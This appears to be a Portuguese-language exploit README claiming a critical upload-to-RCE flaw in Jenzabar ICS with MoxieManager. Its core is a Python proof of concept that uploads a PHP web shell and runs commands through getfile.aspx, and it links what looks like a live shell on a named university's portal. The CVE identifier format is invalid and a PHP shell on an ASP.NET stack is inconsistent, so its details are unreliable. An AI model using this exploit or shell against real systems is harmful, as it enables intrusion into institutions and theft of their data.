# ICS-MoxieManager-RCE-CVE-2026-30-03
CVE-2026-30-03 9.8 (Crítico) Possível RCE Jenzabar ICS + MoxieManager

proff https://www.youtube.com/watch?v=lcfUL6Xx3f4&feature=youtu.be


CVE	CVSS	Impacto	Afetado
CVE-2026-30-03	9.8 (Crítico)	Possível RCE	Jenzabar ICS + MoxieManager

Uma vulnerabilidade no componente MoxieManager utilizado pelo sistema Jenzabar ICS pode permitir o envio inadequado de arquivos, que, sob determinadas condições, podem ser acessados publicamente e potencialmente levar à execução remota de código (RCE).
Descrição Técnica

O problema ocorre devido a:

Falta de validação adequada de arquivos enviados

Possível exposição de arquivos via endpoint público:

/ICS/staticpages/getfile.aspx

Controle de autenticação inconsistente no endpoint:

/ICS/UI/Common/Scripts/tinymce/plugins/moxiemanager/api.ashx

Em cenários específicos, arquivos enviados podem ser armazenados em diretórios acessíveis e posteriormente recuperados.

Impacto
Upload arbitrário de arquivos
Exposição de conteúdo sensível
Possível execução remota de código (dependendo da configuração do servidor)
Comprometimento total do sistema

Classificação
CVSS v3.1: 9.8 (Crítico)
Vector:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE-434: Upload de arquivo sem restrição
CWE-284: Controle de acesso inadequado

PoC Exploit

#!/usr/bin/env python3
# CVE-2026-30-03 PoC - ICS MoxieManager RCE
import requests

TARGET = "https://example.edu"
MOXIE = f"{TARGET}/ICS/UI/Common/Scripts/tinymce/plugins/moxiemanager/api.ashx"
UUID = "5d6b24cb-7bfe-4a6b-8581-4426bf0f4101"

# 1. Upload PHP Shell
files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
data = {'action': 'upload', 'path': '/1085255', 'csrf': 'E24607903E4DC7496732F267BAD48FF35D855DA9E362AB80E0340D5B5EC5F164'}

r = requests.post(MOXIE, files=files, data=data)
print(f"[+] Upload: {r.status_code}")

# 2. Execute
SHELL = f"{TARGET}/ICS/staticpages/getfile.aspx?target=/moxiemanager/files/users/{UUID}/shell.php"
print(f"[+] Shell: {SHELL}?cmd=whoami")
print(requests.get(f"{SHELL}?cmd=whoami").text)


Affected Systems (33+ Confirmed)

Remediation
Immediate (Mitigation):

1. DELETE /moxiemanager/files/users/*/shell.php
2. Restrict getfile.aspx:

3. 
   RewriteRule ^/ICS/staticpages/getfile\.aspx\?target=.*shell\.php - [F,L]
4. Disable MoxieManager uploads


Prof https://my.rsu.edu/ICS/icsfs/shell.asp?target=61d75719-3a6a-4908-bb5d-3f9a443dd443

